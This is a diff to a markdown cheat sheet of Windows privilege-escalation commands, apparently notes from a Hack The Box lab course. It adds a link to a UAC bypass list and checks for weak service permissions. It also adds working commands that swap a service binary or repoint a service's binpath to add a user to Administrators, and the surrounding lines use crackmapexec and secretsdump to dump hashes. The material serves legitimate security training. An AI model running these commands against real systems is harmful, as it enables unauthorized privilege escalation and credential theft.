@@ -2887,7 +2887,7 @@ apt update hooking (PreInvoke)
 | `gci \\.\pipe\` | List named pipes with PowerShell |
 | `accesschk.exe /accepteula \\.\Pipe\lsass -v` | Review permissions on a named pipe |
 
-### Rights and Privileges 
+### Rights, Privileges and Permissions 
 
 #### Permission Groups
 
@@ -2911,6 +2911,8 @@ apt update hooking (PreInvoke)
 
 #### User Access Controls (UAC) 
 
+The [UACME](https://github.com/hfiref0x/UACME) project maintains a list of UAC bypasses, including information on the affected Windows build number, the technique used, and if Microsoft has issued a security update to fix it
+
 ##### UAC Group Policy
 
 | **Group Policy Setting** | **Registry Key** | **Default Setting** |
@@ -2932,6 +2934,7 @@ There is no command-line version of the GUI consent prompt, so its necessary to 
 |---|---|
 | `REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA` | Determine if UAC is enabled (0x1 is True)|
 | `REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin` | Query [ConsentPromptBehaviorAdmin](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/341747f5-6b5d-4d30-85fc-fa1cc04038d4) to determine behaviour  |
+|``||
 
 
 #### User Rights Assignments 
@@ -3186,6 +3189,42 @@ Membership of this group confers the powerful SeBackupPrivilege and SeRestorePri
 |`net localgroup Administrators`| Should now be part of the group|
 |`crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'`| Use crackmapexec to perform activity|
 |`secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator`|Retrieve NTLM Password hashes using secretsdump.py|
+
+---
+
+#### Weak Permissions 
+
+| **Command** | **Description** |
+| --- | --- |
+|`.\SharpUp.exe audit`| SharpUp checks for service binaries suffering from weak ACLs|
+|`icacls PATHTOEXE`|Check permissions assosicated with binary|
+|`cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"`| replace weak binary using cmd|
+|`accesschk.exe /accepteula -quvcw WindscribeService`|[AccessChk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) from the Sysinternals suite to enumerate permissions on the service flags: -q (omit banner), -u (suppress errors), -v (verbose), -c (specify name of a Windows service), and -w (show only objects that have write access). |
+
+```
+C:\htb> accesschk.exe /accepteula -quvcw WindscribeService
+ 
+Accesschk v6.13 - Reports effective permissions for securable objects
+Copyright ⌐ 2006-2020 Mark Russinovich
+Sysinternals - www.sysinternals.com
+ 
+WindscribeService
+  Medium Mandatory Level (Default) [No-Write-Up]
+  RW NT AUTHORITY\SYSTEM
+        SERVICE_ALL_ACCESS
+  RW BUILTIN\Administrators
+        SERVICE_ALL_ACCESS
+  RW NT AUTHORITY\Authenticated Users
+        SERVICE_ALL_ACCESS
+```
+In above example we can see that SERVICE_ALL_ACCESS rights, allowing all authenticated users full read/write control. 
+
+| **Command** | **Description** |
+| --- | --- |
+|`sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"`| set the binary path to run any command or executable of our choosing (such as a reverse shell binary). |
+|`sc stop WindscribeService`|Stop service |
+|`sc start WindscribeService`|Start service containing our command|
+
 
 
 
